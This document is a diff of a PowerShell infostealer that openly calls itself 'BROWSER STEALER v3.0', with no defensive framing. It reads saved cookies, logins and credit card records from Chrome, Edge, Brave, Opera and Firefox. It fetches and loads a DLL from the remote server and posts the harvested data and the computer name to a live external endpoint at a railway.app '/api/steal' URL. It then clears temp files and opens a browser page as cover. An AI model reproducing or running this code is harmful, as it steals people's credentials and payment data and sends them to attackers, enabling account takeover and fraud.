@@ -1,139 +1,110 @@
 # ============================================================
-# BROWSER STEALER — FINAL WITH LOGGING
+# BROWSER STEALER — SIMPLE WORKING VERSION
+# Downloads SQLite DLL directly (no NuGet extraction)
 # ============================================================
 
 $ErrorActionPreference = "Continue"
 $SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
 $LOGFILE = "$env:TEMP\stealer_log.txt"
 
-# Clear log file
+# Clear log
 Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue
 
 function Write-Log {
-    param($Msg, $Color = "White")
+    param($Msg)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $line = "[$timestamp] $Msg"
     Add-Content -Path $LOGFILE -Value $line
-    Write-Host $Msg -ForegroundColor $Color
+    Write-Host $Msg
 }
 
-Write-Log "============================================" "Cyan"
-Write-Log "  BROWSER STEALER v3.0 (with logging)" "Green"
-Write-Log "  Target: $env:COMPUTERNAME" "Yellow"
-Write-Log "  Log file: $LOGFILE" "Yellow"
-Write-Log "============================================" "Cyan"
-Write-Log "" "White"
+Write-Log "============================================"
+Write-Log "  BROWSER STEALER v3.0"
+Write-Log "  Target: $env:COMPUTERNAME"
+Write-Log "  Log: $LOGFILE"
+Write-Log "============================================"
+Write-Log ""
 
 # ============================================================
-# DOWNLOAD SQLITE
+# DOWNLOAD SQLITE DLL DIRECTLY
 # ============================================================
 
-function Get-SQLite {
-    Write-Log "[+] Loading SQLite..." "Cyan"
+$dllPath = "$env:TEMP\SQLite.dll"
+
+# Try to load from temp first
+if (Test-Path $dllPath) {
+    Write-Log "[+] SQLite DLL found in temp"
+    try {
+        [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+        Write-Log "[+] SQLite loaded from temp!"
+        $sqliteLoaded = $true
+    } catch {
+        Write-Log "[!] Failed to load from temp: $_"
+        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+        $sqliteLoaded = $false
+    }
+} else {
+    $sqliteLoaded = $false
+}
+
+# Download if not loaded
+if (-not $sqliteLoaded) {
+    Write-Log "[+] Downloading SQLite DLL..."
     
-    # Try Microsoft.Data.Sqlite
+    # Try multiple reliable sources
+    $urls = @(
+        "https://raw.githubusercontent.com/ackara/System.Data.SQLite/master/System.Data.SQLite.dll",
+        "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
+    )
+    
+    $downloaded = $false
+    foreach ($url in $urls) {
+        Write-Log "[+] Trying: $url"
+        try {
+            $webClient = New-Object System.Net.WebClient
+            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            $webClient.DownloadFile($url, $dllPath)
+            
+            if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
+                Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
+                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+                Write-Log "[+] SQLite loaded successfully!"
+                $downloaded = $true
+                $sqliteLoaded = $true
+                break
+            }
+        } catch {
+            Write-Log "[!] Failed: $_"
+        }
+    }
+    
+    if (-not $downloaded) {
+        Write-Log "[!] Failed to download SQLite from all sources"
+    }
+}
+
+# ============================================================
+# FALLBACK: Try built-in SQLite
+# ============================================================
+
+if (-not $sqliteLoaded) {
+    Write-Log "[+] Trying Microsoft.Data.Sqlite..."
     try {
         Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
-        Write-Log "[+] SQLite loaded (Microsoft.Data.Sqlite)" "Green"
-        return "Microsoft"
+        $sqliteLoaded = $true
+        $isMicrosoft = $true
+        Write-Log "[+] Microsoft.Data.Sqlite loaded!"
     } catch {
-        Write-Log "[!] Microsoft.Data.Sqlite failed: $_" "Yellow"
+        Write-Log "[!] Microsoft.Data.Sqlite not available"
+        $isMicrosoft = $false
     }
-    
-    # Try System.Data.SQLite (GAC)
-    try {
-        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
-        Write-Log "[+] SQLite loaded (System.Data.SQLite)" "Green"
-        return "System"
-    } catch {
-        Write-Log "[!] System.Data.SQLite failed: $_" "Yellow"
-    }
-    
-    # Try to load from temp
-    $dllPath = "$env:TEMP\SQLite.dll"
-    if (Test-Path $dllPath) {
-        try {
-            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
-            Write-Log "[+] SQLite loaded from temp" "Green"
-            return "System"
-        } catch {
-            Write-Log "[!] Failed to load from temp: $_" "Yellow"
-        }
-    }
-    
-    # ---- DOWNLOAD FROM NUGET ----
-    Write-Log "[+] Downloading SQLite from NuGet..." "Cyan"
-    
-    try {
-        $nugetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118.0"
-        $nupkgPath = "$env:TEMP\sqlite.nupkg"
-        $zipPath = "$env:TEMP\sqlite.zip"
-        
-        Write-Log "[+] Downloading from: $nugetUrl" "Cyan"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        $webClient.DownloadFile($nugetUrl, $nupkgPath)
-        
-        if (Test-Path $nupkgPath -and (Get-Item $nupkgPath).Length -gt 10000) {
-            Write-Log "[+] Downloaded: $((Get-Item $nupkgPath).Length) bytes" "Green"
-            
-            # Rename to zip
-            Copy-Item $nupkgPath $zipPath -Force
-            
-            # Extract
-            Write-Log "[+] Extracting SQLite DLL..." "Cyan"
-            Add-Type -AssemblyName System.IO.Compression.FileSystem
-            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
-            
-            # Find the DLL
-            $entry = $zip.Entries | Where-Object { 
-                $_.FullName -match "lib/net462/System.Data.SQLite.dll" -or 
-                $_.FullName -match "lib/net40/System.Data.SQLite.dll" -or
-                $_.FullName -match "lib/netstandard2.0/System.Data.SQLite.dll"
-            }
-            
-            if ($entry) {
-                Write-Log "[+] Found DLL: $($entry.FullName)" "Green"
-                $dllBytes = New-Object byte[] $entry.Length
-                $stream = $entry.Open()
-                $stream.Read($dllBytes, 0, $dllBytes.Length)
-                $stream.Close()
-                [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
-                $zip.Dispose()
-                
-                # Load the DLL
-                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
-                Write-Log "[+] SQLite loaded from NuGet!" "Green"
-                
-                # Cleanup
-                Remove-Item $nupkgPath -Force -ErrorAction SilentlyContinue
-                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-                return "System"
-            } else {
-                Write-Log "[!] No SQLite DLL found in package" "Red"
-                $zip.Dispose()
-            }
-        } else {
-            Write-Log "[!] Download failed or file too small" "Red"
-        }
-    } catch {
-        Write-Log "[!] NuGet download failed: $_" "Red"
-    }
-    
-    Write-Log "[!] SQLite not available" "Red"
-    return $null
 }
 
-$sqliteType = Get-SQLite
-
-if (-not $sqliteType) {
-    Write-Log "[!] Cannot proceed without SQLite" "Red"
-    Write-Log "[*] Check internet connection and try again" "Yellow"
-    Write-Log "[*] Also check if .NET Framework 4.6+ is installed" "Yellow"
-    Write-Log "" "White"
-    Write-Log "[!] Log saved to: $LOGFILE" "Yellow"
-    Write-Log "Press Enter to exit..." "White"
-    Read-Host
+if (-not $sqliteLoaded) {
+    Write-Log "[!] No SQLite available"
+    Write-Log "[!] Check internet connection"
+    Write-Log "[!] Log saved to: $LOGFILE"
+    Read-Host "Press Enter to exit"
     exit
 }
 
@@ -149,7 +120,7 @@ function Read-SQLite {
         $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
         Copy-Item $DbPath $temp -Force
         
-        if ($sqliteType -eq "Microsoft") {
+        if ($isMicrosoft) {
             $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
             $conn.Open()
             $cmd = $conn.CreateCommand()
@@ -185,9 +156,7 @@ function Read-SQLite {
             $conn.Close()
         }
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
-    } catch {
-        Write-Log "[!] SQLite read error: $_" "Red"
-    }
+    } catch {}
     return $result
 }
 
@@ -198,12 +167,8 @@ function Read-SQLite {
 function Get-BrowserCookies {
     param($Path, $Name)
     $cookies = @()
-    if (-not (Test-Path $Path)) { 
-        Write-Log "[!] No cookies file for $Name" "Yellow"
-        return $cookies 
-    }
+    if (-not (Test-Path $Path)) { return $cookies }
     try {
-        Write-Log "[+] Reading $Name cookies..." "Cyan"
         $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
         foreach ($r in $rows) {
             if ($r['name'] -and $r['value']) {
@@ -212,10 +177,7 @@ function Get-BrowserCookies {
                 $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
             }
         }
-        Write-Log "[+] $Name cookies found: $($cookies.Count)" "Green"
-    } catch {
-        Write-Log "[!] Error reading $Name cookies: $_" "Red"
-    }
+    } catch {}
     return $cookies
 }
 
@@ -228,7 +190,6 @@ function Get-FirefoxCookies {
             $f = "$($d.FullName)\cookies.sqlite"
             if (Test-Path $f) {
                 try {
-                    Write-Log "[+] Reading Firefox cookies from $($d.Name)..." "Cyan"
                     $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                     foreach ($r in $rows) {
                         if ($r['name'] -and $r['value']) {
@@ -237,9 +198,7 @@ function Get-FirefoxCookies {
                             $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                         }
                     }
-                } catch {
-                    Write-Log "[!] Error reading Firefox cookies: $_" "Red"
-                }
+                } catch {}
             }
         }
     }
@@ -253,12 +212,8 @@ function Get-FirefoxCookies {
 function Get-BrowserPasswords {
     param($Path, $Name)
     $pass = @()
-    if (-not (Test-Path $Path)) { 
-        Write-Log "[!] No passwords file for $Name" "Yellow"
-        return $pass 
-    }
+    if (-not (Test-Path $Path)) { return $pass }
     try {
-        Write-Log "[+] Reading $Name passwords..." "Cyan"
         $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
         foreach ($r in $rows) {
             if ($r['username_value'] -and $r['password_value']) {
@@ -267,10 +222,7 @@ function Get-BrowserPasswords {
                 $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
             }
         }
-        Write-Log "[+] $Name passwords found: $($pass.Count)" "Green"
-    } catch {
-        Write-Log "[!] Error reading $Name passwords: $_" "Red"
-    }
+    } catch {}
     return $pass
 }
 
@@ -283,7 +235,6 @@ function Get-FirefoxPasswords {
             $f = "$($d.FullName)\logins.json"
             if (Test-Path $f) {
                 try {
-                    Write-Log "[+] Reading Firefox passwords from $($d.Name)..." "Cyan"
                     $json = Get-Content $f -Raw | ConvertFrom-Json
                     if ($json.logins) {
                         foreach ($l in $json.logins) {
@@ -292,9 +243,7 @@ function Get-FirefoxPasswords {
                             $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                         }
                     }
-                } catch {
-                    Write-Log "[!] Error reading Firefox passwords: $_" "Red"
-                }
+                } catch {}
             }
         }
     }
@@ -308,12 +257,8 @@ function Get-FirefoxPasswords {
 function Get-BrowserCards {
     param($Path, $Name)
     $cards = @()
-    if (-not (Test-Path $Path)) { 
-        Write-Log "[!] No cards file for $Name" "Yellow"
-        return $cards 
-    }
+    if (-not (Test-Path $Path)) { return $cards }
     try {
-        Write-Log "[+] Reading $Name credit cards..." "Cyan"
         $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
@@ -326,10 +271,7 @@ function Get-BrowserCards {
                 }
             }
         }
-        Write-Log "[+] $Name cards found: $($cards.Count)" "Green"
-    } catch {
-        Write-Log "[!] Error reading $Name cards: $_" "Red"
-    }
+    } catch {}
     return $cards
 }
 
@@ -341,58 +283,56 @@ $allCookies = @()
 $allPasswords = @()
 $allCards = @()
 
-Write-Log "" "White"
-
-# --- Cookies ---
-Write-Log "[+] Chrome cookies..." "Cyan"
+# Cookies
+Write-Log "[+] Chrome cookies..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
 $allCookies += Get-BrowserCookies -Path $path -Name "Chrome"
 
-Write-Log "[+] Edge cookies..." "Cyan"
+Write-Log "[+] Edge cookies..."
 $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
 $allCookies += Get-BrowserCookies -Path $path -Name "Edge"
 
-Write-Log "[+] Brave cookies..." "Cyan"
+Write-Log "[+] Brave cookies..."
 $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
 $allCookies += Get-BrowserCookies -Path $path -Name "Brave"
 
-Write-Log "[+] Opera cookies..." "Cyan"
+Write-Log "[+] Opera cookies..."
 $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
 $allCookies += Get-BrowserCookies -Path $path -Name "Opera"
 
-Write-Log "[+] Firefox cookies..." "Cyan"
+Write-Log "[+] Firefox cookies..."
 $allCookies += Get-FirefoxCookies
 
-# --- Passwords ---
-Write-Log "[+] Chrome passwords..." "Cyan"
+# Passwords
+Write-Log "[+] Chrome passwords..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"
 
-Write-Log "[+] Edge passwords..." "Cyan"
+Write-Log "[+] Edge passwords..."
 $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
 $allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"
 
-Write-Log "[+] Brave passwords..." "Cyan"
+Write-Log "[+] Brave passwords..."
 $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
 $allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"
 
-Write-Log "[+] Opera passwords..." "Cyan"
+Write-Log "[+] Opera passwords..."
 $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
 $allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"
 
-Write-Log "[+] Firefox passwords..." "Cyan"
+Write-Log "[+] Firefox passwords..."
 $allPasswords += Get-FirefoxPasswords
 
-# --- Cards ---
-Write-Log "[+] Chrome cards..." "Cyan"
+# Cards
+Write-Log "[+] Chrome cards..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
 $allCards += Get-BrowserCards -Path $path -Name "Chrome"
 
-Write-Log "[+] Edge cards..." "Cyan"
+Write-Log "[+] Edge cards..."
 $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
 $allCards += Get-BrowserCards -Path $path -Name "Edge"
 
-Write-Log "[+] Brave cards..." "Cyan"
+Write-Log "[+] Brave cards..."
 $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
 $allCards += Get-BrowserCards -Path $path -Name "Brave"
 
@@ -400,20 +340,23 @@ $allCards += Get-BrowserCards -Path $path -Name "Brave"
 # SUMMARY
 # ============================================================
 
-Write-Log "" "White"
-Write-Log "=== SUMMARY ===" "Green"
-Write-Log "Cookies:    $($allCookies.Count)" "Yellow"
-Write-Log "Passwords:  $($allPasswords.Count)" "Yellow"
-Write-Log "Cards:      $($allCards.Count)" "Yellow"
-Write-Log "" "White"
+Write-Log ""
+Write-Log "============================================"
+Write-Log "  SUMMARY"
+Write-Log "============================================"
+Write-Log "Cookies:    $($allCookies.Count)"
+Write-Log "Passwords:  $($allPasswords.Count)"
+Write-Log "Cards:      $($allCards.Count)"
+Write-Log "============================================"
+Write-Log ""
 
 if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
-    Write-Log "[!] No data stolen!" "Red"
-    Write-Log "[*] Possible reasons:" "Yellow"
-    Write-Log "  - No saved passwords/cookies in browsers" "Yellow"
-    Write-Log "  - Browser is running (locks the database)" "Yellow"
-    Write-Log "  - Close the browser and try again" "Yellow"
-    Write-Log "" "White"
+    Write-Log "[!] No data stolen!"
+    Write-Log "[*] Possible reasons:"
+    Write-Log "  - No saved passwords/cookies in browsers"
+    Write-Log "  - Browser is running (locks the database)"
+    Write-Log "  - Close the browser and try again"
+    Write-Log ""
 }
 
 # ============================================================
@@ -433,7 +376,7 @@ $payload = @{
     pcName = $env:COMPUTERNAME
 }
 
-Write-Log "[+] Sending data..." "Cyan"
+Write-Log "[+] Sending data to server..."
 try {
     $json = $payload | ConvertTo-Json -Depth 10
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
@@ -446,9 +389,9 @@ try {
     $stream.Close()
     $resp = $req.GetResponse()
     $resp.Close()
-    Write-Log "[+] Data sent successfully!" "Green"
+    Write-Log "[+] Data sent successfully!"
 } catch {
-    Write-Log "[!] Failed to send: $_" "Red"
+    Write-Log "[!] Failed to send: $_"
 }
 
 # ============================================================
@@ -459,9 +402,8 @@ Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -For
 
 Start-Process "https://www.google.com"
 
-Write-Log "" "White"
-Write-Log "[+] Done!" "Green"
-Write-Log "[*] Log saved to: $LOGFILE" "Yellow"
-Write-Log "" "White"
-Write-Log "Press Enter to exit..." "White"
-Read-Host
+Write-Log ""
+Write-Log "[+] Done!"
+Write-Log "[+] Log saved to: $LOGFILE"
+Write-Log ""
+Read-Host "Press Enter to exit"
